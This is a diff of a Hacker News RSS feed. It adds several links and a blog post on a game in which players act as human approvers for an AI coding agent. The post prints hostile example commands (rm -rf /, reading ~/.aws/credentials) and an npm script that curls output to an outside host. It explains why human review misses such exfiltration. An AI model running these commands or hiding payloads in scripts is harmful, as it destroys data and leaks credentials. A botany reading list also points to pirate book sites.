@@ -8,7 +8,251 @@
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
     <language>en</language>
-    <lastBuildDate>Wed, 05 Aug 2026 21:29:23 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 06 Aug 2026 12:50:36 +0000</lastBuildDate>
+    <item>
+      <title>Why Do Fewer Renters Expect to Move?</title>
+      <link>https://libertystreeteconomics.newyorkfed.org/2026/08/why-do-fewer-renters-expect-to-move/</link>
+      <description>A look at how Americans’ declining moving rates hold for homeowners and renters alike using data from the New York Fed’s annual SCE Housing Survey.</description>
+      <content:encoded><![CDATA[<p><a href="https://news.ycombinator.com/item?id=49195958">Comments on Hacker News</a></p>]]></content:encoded>
+      <guid isPermaLink="true">https://libertystreeteconomics.newyorkfed.org/2026/08/why-do-fewer-renters-expect-to-move/</guid>
+      <category>Hacker News</category>
+      <pubDate>Thu, 06 Aug 2026 12:50:36 +0000</pubDate>
+      <dc:creator>jnord</dc:creator>
+    </item>
+    <item>
+      <title>Humans missed 1 in 3 threats approving AI agent commands across 40k game runs</title>
+      <link>https://scalex.dev/blog/ai-agent-permissions-stats/</link>
+      <description>Results from AI agent permission game: which attacks beat human reviewers, and which safe commands got blocked instead.</description>
+      <content:encoded><![CDATA[<p>A couple of months ago I published <a href="https://llmgame.scalex.dev">a small browser game</a>: you play the human-in-the-loop for an AI coding agent, approving or denying its commands under time pressure. Some commands are routine (<code>git status</code>, <code>npm test</code>) and some other commands indicate your agent has been possessed and is sending your secrets to a remote server (<code>cat ~/.aws/credentials</code>). More on the threats associated with agents running commands and how to mitigate them can be found in the <a href="https://scalex.dev/blog/ai-agent-permissions/">original post</a>.</p>
+<p>The game garnered some interest on <a href="https://news.ycombinator.com/item?id=48308376">hacker news</a>, and after adding in statistics (unfortunately a bit later on) we can take a closer look at the data of over 40,000 runs and 409,000 individual approve/deny decisions. Let’s see how the human-in-the-loop, our last line of defence against rogue agents, fared.</p>
+<h2 id="the-headline-numbers">The headline numbers</h2>
+<p><figure><a><img alt="Overall game statistics" src="https://scalex.dev/img/permission_game_stats_card.png"/></a></figure></p>
+<ul><li>The average player missed <strong>1 in 3 threats</strong> (mean accuracy 66.3%)</li><li><strong>32.9%</strong> of sessions ended with a negative score: penalties from approved threats and blocked safe commands outweighed everything done right</li><li><strong>35.2%</strong> of players caught every threat, but only <strong>20.8%</strong> managed that while blocking at most 1 in 5 of the safe commands. The rest got there partly by blocking everything (awarding the “Human Bottleneck” title)</li><li><strong>7%</strong> approved every single prompt: big fans of <code>--dangerously-skip-permissions</code></li></ul>
+<p>Small caveat: this was a game, where approximately 34% of the commands players saw were threats. In our day-to-day work these threats appear rarely. Players knew they were being tested in a time-boxed challenge. But the numbers below might be useful for garnering some insights on comparing threats and the general awareness of them against one another.</p>
+<h2 id="threat-categories-and-miss-rates">Threat categories and miss rates</h2>
+<table><thead><tr><th>Category</th><th>Examples</th><th>Miss rate</th></tr></thead><tbody><tr><td>Obvious destructive</td><td><code>rm -rf /</code>, <code>chmod -R 777 /</code></td><td><strong>11.7%</strong></td></tr><tr><td>Persistent mutation</td><td>crontab injection, git config hijack</td><td><strong>23.8%</strong></td></tr><tr><td>Exfiltration / code execution</td><td>curl to unknown APIs, typosquatted packages</td><td><strong>33.4%</strong></td></tr><tr><td>Scope violations</td><td><code>cat ~/.aws/credentials</code>, <code>cat ~/.kube/config</code></td><td><strong>35.0%</strong></td></tr></tbody></table>
+<p>The blatantly destructive commands are caught most reliably. The commands that actually exfiltrate your credentials are missed three times as often.</p>
+<h2 id="the-npm-run-blind-spot">The <code>npm run</code> blind spot</h2>
+<p>The single most-missed command in the game is <code>npm run analyze</code>, approved <strong>64.7%</strong> of the time. The command by itself is typically innocent. But what <code>npm run</code> really does is run a script that’s defined in your project’s <code>package.json</code>.
+It could be benign code such as running a bundle analyzer, or injected code that was written to file before.</p>
+<p>The game does tell you in the agent’s history log what that script actually contains:</p>
+<pre><code>1✻ I'll run the bundle analyzer — it's already set up in the project scripts.
+2  // package.json → scripts
+3  "analyze": "webpack-bundle-analyzer stats.json | tee /dev/fd/1 | 
+4  curl -s -X POST https://api.bundle.track/report -d @-"
+</code></pre>
+<p>Two thirds of players approved it anyway, indicating the history log just above the permission prompt may not be read closely.
+There are three of these in the game, and they appear in the most-missed list:</p>
+<table><thead><tr><th>Command</th><th>Miss rate</th><th>Rank (of 37 threats)</th></tr></thead><tbody><tr><td><code>npm run analyze</code></td><td><strong>64.7%</strong></td><td><strong>1st</strong></td></tr><tr><td><code>npm run setup</code></td><td><strong>48.0%</strong></td><td>4th</td></tr><tr><td><code>npm run deploy</code></td><td><strong>44.9%</strong></td><td>8th</td></tr></tbody></table>
+<p>Pooled, the three were missed <strong>52.5%</strong> of the time (n=9,482) against <strong>28.4%</strong> for every other exfiltration-style attack. Hiding a payload behind a familiar script name roughly doubles its success rate even when the payload is shown in the history log.</p>
+<p>Which is really a symptom of the bigger problem, well put by dns_snek in the <a href="https://news.ycombinator.com/item?id=48308376">Hacker News thread</a>:</p>
+<blockquote><p>That’s a great example of how dangerous actions are perceived as innocent. The entire model of approving specific commands is absolutely bonkers.</p><p><code>npm run build</code> = run an arbitrary shell command written in package.json</p><p>Meanwhile the agent could have done any of the following without approval:</p><ul><li>edited <code>package.json</code> to contain any arbitrary build command</li><li>planted malicious code in <code>build.js</code> (called by <code>npm run build</code>)</li><li>planted malicious code in <code>node_modules/xyz/index.js</code> (imported by <code>build.js</code>)</li></ul></blockquote>
+<p>Asking the user to validate commands, which are nearly all of the time safe, but aren’t anymore because of modified files, is not a strong safeguard.</p>
+<h2 id="miss-rates-increase-under-pressure">Miss rates increase under pressure</h2>
+<p>Anthropic previously noted permission fatigue is real in claude code, with the following quote:</p>
+<blockquote><p>The more approvals a user sees, the less attention they pay to each, becoming over time much less diligent in their supervision</p></blockquote>
+<p>And although it’s a short game where the user is warned about threats, we can see some signs of degradation towards the end of game runs:</p>
+<p><figure><a><img alt="Miss rate rises at the end of every session length" src="https://scalex.dev/img/miss_rate_by_position.png"/></a></figure></p>
+<p>The graph above shows the threat miss rate along the session, with the plays grouped together on how many commands the user completed. Users completing a lower number of commands can be due to the user taking more time to review them, or because of the game freezing for a couple of seconds after an error was made as penalty.
+I’ve removed all the users who simply blocked everything.</p>
+<p>Every group improves over the first couple of commands (warming up?) and then the <strong>miss rates climb back up</strong> towards the end. Although this might also be the stress of the clock running out and the player becoming more likely to make mistakes to get some extra commands in.</p>
+<h2 id="the-cost-of-vigilance-over-blocking">The cost of vigilance: over-blocking</h2>
+<p>The following commands were benign in intent, but routinely blocked:</p>
+<ul><li><code>npm config set registry https://npm.internal</code> — blocked <strong>59%</strong> of the time (setting an internal mirror)</li><li><code>rm -rf dist/</code> — blocked <strong>45%</strong> of the time (clearing build output, not uncommon to perform before a new build)</li><li><code>kill $(lsof -t -i:3000)</code> — blocked <strong>43%</strong> of the time (freeing the port the server is listening on, potentially because of a crashed process)</li></ul>
+<p>This is the other side of the human-in-the-loop dilemma. Users are asked to approve commands which are actually benign, and blocking them slows the agent down. Over time this noise will likely result in users dropping their guard and approving malicious commands. Features such as Anthropic’s ‘Auto Mode’ try to mitigate this by automatically trying to determine if a command is safe before asking you, but they are not fool-proof as mentioned in <a href="https://scalex.dev/blog/ai-agent-permissions/">the previous post</a>.</p>
+<h2 id="the-contested-cat">The contested cat</h2>
+<p><code>cat ~/.zshrc</code> was approved by <strong>45.9%</strong> of players, the most divisive command in the game. The objection (raised on HN) is fair: plenty of developers keep no secrets in their shell profile, so for them it <em>is</em> harmless. For the many who export API keys there, it’s credential disclosure. The command’s risk depends entirely on a setup the agent can’t see. If you <code>source</code> a separate secrets file from your <code>.zshrc</code> instead, the risk of your agent getting more access is reduced.</p>
+<h2 id="the-takeaway">The takeaway</h2>
+<p>I’ve enjoyed following the discussions on the human-in-the-loop, and learning more on permission models along the way. While it’s just a game, I find it does demonstrate several issues with humans-in-the-loop as safeguard for AI coding agents.
+The high amount of noise introduces fatigue, and developers don’t always have the context of what has changed to quickly determine the risk.</p>
+<p>For developers, we need to be very familiar with the trade-offs of different permissions models and how to reduce the risks involved such as applying sandboxing and separating credentials and env var secrets.
+The <a href="https://scalex.dev/blog/ai-agent-permissions/">original post</a> covers some of these practical mitigations.</p>
+<p>If you want to try your luck at the game, you can find it here: <a href="https://llmgame.scalex.dev">https://llmgame.scalex.dev</a></p>
+<p><a href="https://news.ycombinator.com/item?id=49195468">Comments on Hacker News</a></p>]]></content:encoded>
+      <guid isPermaLink="true">https://scalex.dev/blog/ai-agent-permissions-stats/</guid>
+      <category>Hacker News</category>
+      <pubDate>Thu, 06 Aug 2026 11:58:07 +0000</pubDate>
+      <media:content url="https://scalex.dev/img/permission_game_stats_card.png" type="image/png" medium="image"/>
+      <dc:creator>Wirbelwind</dc:creator>
+    </item>
+    <item>
+      <title>Show HN: demake – one source project compiles to any retro game console ROM</title>
+      <link>https://geosona.com/demake/</link>
+      <description>Convert any image into hardware-compliant art and displayable code for 8/16-bit-era consoles and handhelds. Runs entirely in your browser — nothing is uploaded.</description>
+      <content:encoded><![CDATA[<p><a href="https://news.ycombinator.com/item?id=49195251">Comments on Hacker News</a></p>]]></content:encoded>
+      <guid isPermaLink="true">https://geosona.com/demake/</guid>
+      <category>Hacker News</category>
+      <pubDate>Thu, 06 Aug 2026 11:28:00 +0000</pubDate>
+      <dc:creator>gste</dc:creator>
+    </item>
+    <item>
+      <title>Mario Meets Pareto</title>
+      <link>https://www.mayerowitz.io/blog/mario-meets-pareto</link>
+      <description>Discover how to find the best Mario Kart 8 build using the Pareto frontier method. This interactive guide explores multi-objective optimization of speed, acceleration, and other key stats to help you beat your friends on the race track.</description>
+      <content:encoded><![CDATA[<p>0</p>
+<img alt="Shape of a body" height="40" src="https://r2.mayerowitz.io/mk8_data/images/100px-StandardKartBodyMK8.png"/>
+<p>0</p>
+<img alt="Shape of a tire" height="40" src="https://r2.mayerowitz.io/mk8_data/images/100px-StandardTiresMK8.png"/>
+<p>0</p>
+<img alt="Shape of a glider" height="40" src="https://r2.mayerowitz.io/mk8_data/images/100px-SuperGliderMK8.png"/>
+<p>0</p>
+<p>In Mario Kart 8, choosing your driver, kart's body, tires, and glider isn't just
+                    about style — it's as crucial as your racing skills to win a race. Ever
+                    wondered how to truly find the best ones?</p>
+<p>For each of those four elements, you have tens of options. For each option,
+                    there are distinct statistics (speed, acceleration, ...) affecting your
+                    performance.</p>
+<p>This adds up to an unbelievable amount of builds to choose from.</p>
+<p>Hopefully, many choices are just stylistic — they have identical
+                    statistics — but even after ignoring those duplicates, it remains a tough
+                    job to navigate the thousands of options.</p>
+<p>Is there any chance to find the best build or is it
+                    just luck? Should you favor <i>speed</i> to be the fastest, or
+                    <i>acceleration</i>
+                    to quickly recover after taking a hit? Let me show you a solution proposed over a
+                    century ago by economist Vilfredo Pareto.</p>
+<p>Finding the fastest driver is as simple as ranking them by their <i>speed</i>
+                    statistic. Here you might think that
+                    Bowser or
+                    Wario are a no-brainer.</p>
+<p>But you can't just rely on
+                    speed
+                    to find the optimal build. You have to consider
+                    one as well. Now, finding the best
+                    
+                    is not trivial anymore — you have to make trade-offs between
+
+                    
+                    and
+                     <br/> </p>
+<p>Look closely though! You'll find out that some options are always <i>dominated</i>. Let's focus on this poor
+                    Koopa for instance.</p>
+<p>Cat Peach has more speed for the same acceleration, and
+                    Toadette has more acceleration for the same speed. Between you and me, if you
+                    want to win, never allow
+                    Koopa to sit in your kart!</p>
+<p>You can identify all efficient drivers that, unlike Koopa, are never dominated
+                    on both <i>speed</i> and <i>acceleration</i>. Together, they form what is called
+                    the <i>Pareto front</i> (or frontier).</p>
+<p>Mind you: not all elements of the frontier are equally good. You probably won't
+                    pick a driver sitting on the edge of the frontier because you want some balance
+                    between <i>speed</i> and <i>acceleration</i>. The Pareto <i>efficiency</i> is an
+                    objective criteria to filter out suboptimal choices, but you still need to make up
+                    your final decision.</p>
+<p>Given your play style and skills, you may put more
+                    weight on one statistic over
+                    the other. Those preferences will reveal the component on the frontier that
+                    suits you the best.
+                       <p>Best
+                        
+                        : {}<br/></p></p>
+<p>In practice, you not only choose a driver, but a full set of body, wheels, and glider.
+            In the next section, I'll display every build as a distinct point. It will however make
+            the number of choices explode. But Pareto's with us!</p>
+<p>We've had a bit of fun here, but don't you see the pattern? We're often faced with
+            similar trade-offs. You want a <a href="https://en.wikipedia.org/wiki/Noodle_soup">meal that's both cheap and delicious</a>? A job that's both well-paid, easy, and fulfilling?
+            <a href="https://en.wikipedia.org/wiki/Modern_portfolio_theory">A portfolio with low risks and high returns</a>? A flexible and strong material that's also easy to produce?
+            <a href="https://academic.oup.com/restud/article-abstract/38/2/175/1527903">A fair taxation that remains efficient</a>
+            ?
+            <a href="https://artificialanalysis.ai/#summary">A high quality LLM that is also fast and cost-efficient</a>. In all these cases, you're facing a multi-objective optimization problem, and you
+            have to make trade-offs.</p>
+<p>Of course, if you already know the exact weights you want to assign to each dimension
+            (i.e., you know your utility function), you reduce the problem to a single objective
+            optimization. This is because you can combine the dimensions with the weights into a
+            single quantity to optimize (often called utility, cost, or fitness). In that case, you
+            don't need Pareto at all.</p>
+<p>But you're often faced with situations where your utility function is unknown or
+            uncertain. In those situations, the Pareto front helps you eliminate objectively all the
+            sub-optimal options. It won't reveal the one best option right from the outset, but you
+            may now experiment with these efficient options and select the one that fits you the
+            best.</p>
+<h3>Acknowledgments</h3>
+<p>I've made some simplifying assumptions in this article to keep it readable for a large
+            audience. In truth, the statistics that I presented are translated into derived in-game
+            stats that are not always linear with the base statistics. Additionally, there are 4
+            speed stats and 4 handling stats for all gears (except for the driver), but I decided to
+            simply average those. I've also completely hidden the functional form of the utility
+            function, which can play a great role. To get access to more details behind this article
+            or if you just like my work and want to see more in the future, please consider
+            <a href="https://ko-fi.com/antoinemayerowitz">donating some coins</a>.</p>
+<h3>Credits</h3>
+<p>Super Mario Wiki
+            <a href="https://www.mariowiki.com/Mario_Kart_8_Deluxe_in-game_statistics">Mario Kart 8 Deluxe in-game statistics</a></p>
+<p>Henry H.
+            <a href="https://hinnefe2.github.io/python/tools/2015/09/21/mario-kart.html">Mario Kart and the Pareto Frontier</a>, 2015</p>
+<p><a href="https://news.ycombinator.com/item?id=49195231">Comments on Hacker News</a></p>]]></content:encoded>
+      <guid isPermaLink="true">https://www.mayerowitz.io/blog/mario-meets-pareto</guid>
+      <category>Hacker News</category>
+      <pubDate>Thu, 06 Aug 2026 11:24:53 +0000</pubDate>
+      <media:content url="https://r2.mayerowitz.io/mk8_data/images/100px-StandardKartBodyMK8.png" type="image/png" medium="image"/>
+      <dc:creator>theanonymousone</dc:creator>
+    </item>
+    <item>
+      <title>On non-rooted Android 17, ADB uninstall of system apps fails</title>
+      <link>https://github.com/Universal-Debloater-Alliance/universal-android-debloater-next-generation/issues/1426</link>
+      <description>Describe the feature you want The "Disable mode" ("Freeze" in AppManager) should be the default. "Uninstall" causes too much problems Acknowledgements This issue is not a duplicate of an existing f...</description>
+      <content:encoded><![CDATA[<h3>        Uh oh!
+</h3>
+<p> <p>There was an error while loading. <a href="">Please reload this page</a>.</p>
+</p>
+<p>Labels</p>
+<a href="https://github.com/Universal-Debloater-Alliance/universal-android-debloater-next-generation/issues?q=state%3Aopen%20label%3A%22enhancement%22">enhancementNew feature or request</a>
+<h2>Description</h2>
+<h2>Issue actions</h2>
+<p><a href="https://news.ycombinator.com/item?id=49193173">Comments on Hacker News</a></p>]]></content:encoded>
+      <guid isPermaLink="true">https://github.com/Universal-Debloater-Alliance/universal-android-debloater-next-generation/issues/1426</guid>
+      <category>Hacker News</category>
+      <pubDate>Thu, 06 Aug 2026 06:24:42 +0000</pubDate>
+      <dc:creator>microtonal</dc:creator>
+    </item>
+    <item>
+      <title>Crime Pays but Botany Doesn't</title>
+      <link>https://www.crimepaysbutbotanydoesnt.com/reading-list</link>
+      <description>I frequently get messages from people who really want to teach themselves botany and learn exactly where the fuck to start identifying plants and learning about them. The field is full of intimidating words (as well as some powdery stiffs, like much of Academia) and a confusing lexicon that can be a turn off to the layperson. I’m telling you this though - don’t be intimidated. With the internet, you have 24 hour access to the library. Use it. Ask questions. See a word you don’t understand? Look it up. Read about a concept that doesn’t make any sense to you (ie “what the shit does ‘monophyletic’ mean and why is it important)? Figure out what about it is confusing and ask the damn google.</description>
+      <content:encoded><![CDATA[<h2> SO YOU WANT TO TEACH YOURSELF BOTANY…</h2>
+<p>I frequently get messages from people who really want to teach themselves botany and learn exactly where the fuck to start identifying plants and learning about them. The field is full of intimidating words (as well as some powdery stiffs, like much of Academia) and a confusing lexicon that can be a turn off to the layperson. I’m telling you this though - don’t be intimidated. With the internet, you have 24 hour access to the library. Use it. Ask questions. See a word you don’t understand? Look it up. Read about a concept that doesn’t make any sense to you (ie “what the shit does ‘monophyletic’ mean and why is it important)? Figure out what about it is confusing and ask the damn google. </p>
+<p>That said, there are some key concepts you should understand that will make things a lot easier. They are: </p>
+<p><strong>Latin terminology</strong> - why do we use Latin? Well, because some dead guy named Linnaeus realized we need a universal system that scientists from multiple different cultures could use (at the time, he was probably mostly thinking of “white European cultures”, and while we can acknowledge how backwards and fucking goofy this is now, we can still admit that Linnaeus’ ideology was simply flawed like his time and NOT throw out the baby with the proverbial bath water. The fucker created a beautiful system, and it works. And that’s why we still use it. I say this because a few unthinking “performative leftist” nitwits as of late have decided to attack the science of taxonomy itself). Common names simply don’t work on a large scale. One common name (ie “cedar”) can refer to 8 different totally unrelated plants, where as <em>Cedrus</em> refers specifically to the genus which contains the species <em>C. libani, C. deodara, </em> and <em>C. atlantica. </em>When botanic names (or any organism’s name) is written in scientific nomenclature, the genus name is capitalized and the species name is lower case, and the name itself is usually written in italics. If you write a species name “Cedrus Atlantica” it is a dead give-away that you don’t know what the fuck you are doing. I was politely corrected on this point more than a decade ago, and I never hesitate to politely correct others. It’s like being courteous enough to tell somebody that they have a booger on their face. </p>
+<p><strong>Taxonomy : IS THERE A METHOD TO THE MADNESS? WHAT GIVES?</strong> - In short, yes, there is, absolutely, and it is so FUCKING cool. Why is it cool? Because we now group things according to how evolutionarily related are, and how they evolved. Once you learn the key concepts and traits that unite a family or a genus or a tribe, you can now identify members of that evolutionary grouping that you have never seen before. This is how I can see a plant that I have never encountered before and automatically know what other plants its related to, what family or genus it is in, and thus know what taxonomic group to search for it under (on inaturalist using the “explore” feature or with a key (flora), etc).</p>
+<ul>
+<li>
+
+<h2>Plant Systematics by Michael Simpson</h2>
+
+<p>This is the seminal textbook to use if you are deciding to take the deeper dive into botany. Plant Systematics is the study of plant evolution, and furthermore is the study of plant identification as it relates to plant evolution via an understanding of SYNAPOMORPHIES. This textbook by Dr. Michael Simpson lays out why botanists were able to tell how closely related certain plant families and orders were BEFORE the advent of DNA analysis, as well as why some of those prior assumptions were found to be wrong. This is a family-by-family, and order-by-order way to become familiar with plant morphology and evolution. This is also an excellent way to one day be able to see new plants that you have never seen before and automatically know what families or genera they might be related to simply by observing them. At present, the third edition is the most current and it is a book that you will use as a reference for the next ten years (at least) of your life. </p>
+
+</li>
+<li>
+
+<h2> Raven's Biology of Plants</h2>
+
+<p>This textbook covers many of the basics of plant biology as well as getting into the nuances of plant evolution, with excellent examples of some of the more charismatic and curious plant species out there. It also does a great job of explaining what botanists know so far about how plants evolve and how selection pressures work to cause all the “variations on a theme” and “endless forms most beautiful” that got Darwin all horny. What is an ecotype you say? What is the Hardy-Weinberg theorem? What are allele frequencies? What is convergent evolution? All these concepts are explained, in depth, in this excellent text book.</p>
+
+</li>
+<li>
+
+<h2>Additional Texts</h2>
+
+<p>It’s always great to be able to support authors by buying their books, but sometimes the cost of self-education can prohibitive. It is my firm belief that any of the authors listed below (unless they’re dicks) would not want anyone to be prohibited from reading their work. This is why sources like www.libgen.is and www.sci-hub.se and other book sharing websites exist. In this case I suggest purchasing a cheap android tablet and becoming acquainted with the idea of reading textbooks in pdf form. A half pound electronic device can store upwards of half a million pages or more worth of textbooks. </p><p>Phylogeny and Evolution of the Angiosperms by Pam and Doug Soltis</p><p>The Tangled Tree by David QUammen - A Good pop-sci explanation of molecular phylogenetics and understanding evolution</p><p>Plant Evolution : An Introduction to the History of Life by Karl Niklas</p><p>Botany Illustrated by Janice Glimm-Lacy</p><p>Annals of the Former World (geology) by John Macphee</p><p>Botany for Gardeners by Brian Capon</p><p>The Ecology of Plants by Jessica Gurevitch</p><p>A Botanist’s Vocabulary by Susan Pell</p><p>The Rose’s Kiss by Peter Bernhardt</p><p>Flowering Plant Families by Wendy Zomlefer</p><p>How the Earth Turned Green by Joseph Armstrong</p><p>The Origin, Expansion, and Demise of Plant Species by Donald Levin</p><p>The Ecology of Seeds by Michael Fenner</p><p>The Fungi by Sarah Watkinson</p><p>Biogeography : An Ecological and Evolutionary Approach by C. Barry Cox</p><p>Evolution Making Sense of Life by Carl Zimmer</p><p>Cacti Biology and Uses</p><p>An Island Called California by Elna Baker (a great text due to it’s explanation of ecological relationships even if you don’t live in California)</p><p>Serpentine Geoecology of  Western North America by Earl Alexander</p><p>A Natural History of California by Allan Schoenherr</p><p>Ecology of Desert Systems by Whitford</p><p>The California Deserts by Bruce Pavlik</p><p>Plant and Animal Endemism in California by Susan Harrison (again - great explanations even if you’re not into California. IT is a great case study)</p>
+
+</li>
+</ul>
+<p><a href="https://news.ycombinator.com/item?id=49192566">Comments on Hacker News</a></p>]]></content:encoded>
+      <guid isPermaLink="true">https://www.crimepaysbutbotanydoesnt.com/reading-list</guid>
+      <category>Hacker News</category>
+      <pubDate>Thu, 06 Aug 2026 04:46:35 +0000</pubDate>
+      <dc:creator>DarkContinent</dc:creator>
+    </item>
+    <item>
+      <title>Nashville uses eminent domain to block data center near zoo</title>
+      <link>https://www.costar.com/article/970809918/nashville-council-approves-eminent-domain-action-to-halt-data-center-project</link>
+      <description>Nashville uses eminent domain to block data center near zoo</description>
+      <content:encoded><![CDATA[<p><a href="https://news.ycombinator.com/item?id=49191624">Comments on Hacker News</a></p>]]></content:encoded>
+      <guid isPermaLink="true">https://www.costar.com/article/970809918/nashville-council-approves-eminent-domain-action-to-halt-data-center-project</guid>
+      <category>Hacker News</category>
+      <pubDate>Thu, 06 Aug 2026 02:15:14 +0000</pubDate>
+      <dc:creator>mapping365</dc:creator>
+    </item>
     <item>
       <title>The title cards in Blade Runner are amazing</title>
       <link>https://randsinrepose.com/archives/blade-runner-title-cards/</link>
@@ -3078,298 +3322,6 @@ const shift = (right - left) / (2 * scale);</code></pre>
       <pubDate>Tue, 04 Aug 2026 22:22:12 +0000</pubDate>
       <media:content url="https://earendil.com/static/posts/pi-autoresearch-and-databricks/databricks-cost-per-task.png" type="image/png" medium="image"/>
       <dc:creator>luispa</dc:creator>
-    </item>
-    <item>
-      <title>DuckDB – Data power tools for your laptop, now in Clojure (2023)</title>
-      <link>https://techascent.com/blog/just-ducking-around.html</link>
-      <description>A well-written, *FAST* data science database for your laptop.</description>
-      <content:encoded><![CDATA[<h2>DuckDB - Data power tools for your laptop, now in Clojure</h2>
-<h4>Establishing the Need</h4>
-<p>Our in-memory column-major data processing platform, <a href="https://github.com/techascent/tech.ml.dataset">tech.ml.dataset</a> (TMD), drives the future of functional data science. When data gets large enough not to fit in memory, one can continue with TMD by operating on samples of data, or otherwise filtering to relevant subsets to fit in bounds imposed by the working environment. Moreover, one can accomplish persistence, for data small and large, with nippy, arrow, or <a href="https://techascent.com/blog/clojure-csv-parquet.html">parquet</a>.</p>
-<p>When data becomes large enough, for example sets of .csv files on the order of ~100GB with relational aspects to them, the tools in their current state can become unwieldy. One is tempted to get involved in nonfunctional sparky cluster snafus. Of course, maintaining some level of transactional interaction and a simple disk IO model is still super-desirable. Local disks are big enough, and local chips are fast enough, no need to do anything rash.</p>
-<p>Relational databases are well adapted for out-of-memory storage and fast relational queries - but, how to leverage this without giving up the advantages of functional programming, and TMD's column-major processing model? JDBC, along with Postgres, provide a good first answer to this question, but it's irritating to perform a full row-to-column conversion through an inefficient, non-batched API in order to get the data through JDBC and into TMD.</p>
-<h4>A New Challenger Appears</h4>
-<p>DuckDB showed up via a <a href="https://github.com/techascent/tech.ml.dataset/issues/241">github issue</a> in May of 2021 and <a href="https://github.com/techascent/tmducken">tmducken</a> was minimally integrated with their C bindings by December of that year. In that version, all query results were returned at once, and so needed to fit in memory. Also, in those early days of DuckDB there was not a specific high performance append or insert system, so IO was limiting potential performance, and Postgres persisted as the adjunct processing system to TMD. Much has changed since then.</p>
-<p>In the last two years, DuckDB improved a lot. Importantly, the C interface now provides a batched system for both inserts and querying, which enables processing very large joins - more on that later. These improved capabilities can now be leveraged in Clojure, through TMD, to access DuckDB's state of the art vectorized SQL execution engine, and it's good.</p>
-<h4>Actual Use</h4>
-<p>Building on our <a href="https://techascent.com/blog/clojure-csv-parquet.html">previous post</a>, there is a 50 gigabyte .csv file with 3 years of transaction data, totaling 400,000,000 rows:</p>
-<pre><code>$ ll -h data.csv
--rw-rw-r-- 1 harold harold 50G Aug  8 09:49 data.csv
-</code></pre>
-<p>Loading that into DuckDB is surprisingly easy - though, you do have to wait 2 minutes:</p>
-<pre><code>$ time duckdb data.ddb 'CREATE TABLE data AS FROM "data.csv";'
-100% ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-
-real	1m50.091s
-user	21m42.693s
-sys	0m57.887s
-$ ll -h data.ddb
--rw-rw-r-- 1 harold harold 18G Sep  6 10:57 data.ddb
-</code></pre>
-<p>So, that reduced the file to 18GB, which includes all of the indexes (!) created automatically by DuckDB.</p>
-<p>The data is in there:</p>
-<pre><code>$ duckdb data.ddb
-v0.8.1 6536a77232
-Enter ".help" for usage hints.
-D SELECT COUNT(*) AS n FROM data;
-âââââââââââââ
-â     n     â
-â   int64   â
-âââââââââââââ¤
-â 400000000 â
-âââââââââââââ
-D DESCRIBE TABLE data;
-ââââââââââââââââââ¬ââââââââââââââ¬ââââââââââ¬ââââââââââ¬ââââââââââ¬ââââââââââ
-â  column_name   â column_type â  null   â   key   â default â  extra  â
-â    varchar     â   varchar   â varchar â varchar â varchar â varchar â
-ââââââââââââââââââ¼ââââââââââââââ¼ââââââââââ¼ââââââââââ¼ââââââââââ¼ââââââââââ¤
-â customer-id    â VARCHAR     â YES     â         â         â         â
-â day            â BIGINT      â YES     â         â         â         â
-â inst           â TIMESTAMP   â YES     â         â         â         â
-â month          â BIGINT      â YES     â         â         â         â
-â brand          â VARCHAR     â YES     â         â         â         â
-â style          â VARCHAR     â YES     â         â         â         â
-â sku            â VARCHAR     â YES     â         â         â         â
-â year           â BIGINT      â YES     â         â         â         â
-â transaction-id â VARCHAR     â YES     â         â         â         â
-â quantity       â BIGINT      â YES     â         â         â         â
-â price          â DOUBLE      â YES     â         â         â         â
-ââââââââââââââââââ´ââââââââââââââ´ââââââââââ´ââââââââââ´ââââââââââ´ââââââââââ¤
-â 11 rows                                                    6 columns â
-ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-</code></pre>
-<p>Accessing this from Clojure, through TMD, is also easy:</p>
-<pre><code>user&gt; (require '[tmducken.duckdb :as duckdb])
-nil
-user&gt; (require '[tech.v3.dataset :as ds])
-nil
-user&gt; (duckdb/initialize!)
-Sep 06, 2023 11:00:12 AM clojure.tools.logging$eval7454$fn__7457 invoke
-INFO: Attempting to load duckdb from "./binaries/libduckdb.so"
-true
-user&gt; (def db (duckdb/open-db "data.ddb"))
-#'user/db
-user&gt; (def conn (duckdb/connect db))
-#'user/conn
-user&gt; (time (duckdb/sql-&gt;dataset conn "SELECT COUNT(*) AS n FROM data"))
-"Elapsed time: 10.305756 msecs"
-:_unnamed [1 1]:
-
-|         n |
-|----------:|
-| 400000000 |
-</code></pre>
-<p>Now, imagine management lets us know that there is another dataset, that captures information for each sku about what colors the product is. That needs to be in the database as well:</p>
-<pre><code>user&gt; (-&gt; (let [colors ["red" "green" "blue" "yellow" "purple" "black" "white"]]
-            (-&gt;&gt; (for [brand (range 100)
-                       style (range 10)
-                       item (range 10)]
-                   (let [sku (format "sku-%s-%s-%s" brand style item)
-                         n (rand-int 8)]
-                     (for [color (take n (shuffle colors))]
-                       {"sku" sku
-                        "color" color})))
-                 (apply concat)))
-          (ds/-&gt;dataset {:dataset-name "colors"}))
-colors [35179 2]:
-
-|        sku |  color |
-|------------|--------|
-|  sku-0-0-0 |    red |
-|  sku-0-0-0 |   blue |
-|  sku-0-0-0 |  white |
-|  sku-0-0-0 | yellow |
-|  sku-0-0-0 |  black |
-|  sku-0-0-0 |  green |
-|  sku-0-0-1 |  black |
-|  sku-0-0-1 | yellow |
-|  sku-0-0-1 |   blue |
-|  sku-0-0-1 | purple |
-|        ... |    ... |
-| sku-99-9-8 | yellow |
-| sku-99-9-8 | purple |
-| sku-99-9-8 |  black |
-| sku-99-9-8 |    red |
-| sku-99-9-8 |  white |
-| sku-99-9-8 |   blue |
-| sku-99-9-8 |  green |
-| sku-99-9-9 | purple |
-| sku-99-9-9 |   blue |
-| sku-99-9-9 |  black |
-| sku-99-9-9 |  green |
-user&gt; (duckdb/create-table! conn *1)
-"colors"
-user&gt; (duckdb/insert-dataset! conn *2)
-35179
-</code></pre>
-<p>You know where this is going. We need to join the 400M transactions, each with a sku, with this data that implies each sku has about 3.51 colors.</p>
-<p>Luckily, their first request is relatively simple. "How many items of each color were sold in March of 2021?", and "When can we know?" they ask.</p>
-<pre><code>;; First, because you can, join 1.4 billion rows on your laptop in 2.5s...
-user&gt; (time (duckdb/sql-&gt;dataset conn "SELECT COUNT(*) FROM data INNER JOIN colors ON data.sku = colors.sku;"))
-"Elapsed time: 2486.620275 msecs"
-:_unnamed [1 1]:
-
-| count_star() |
-|-------------:|
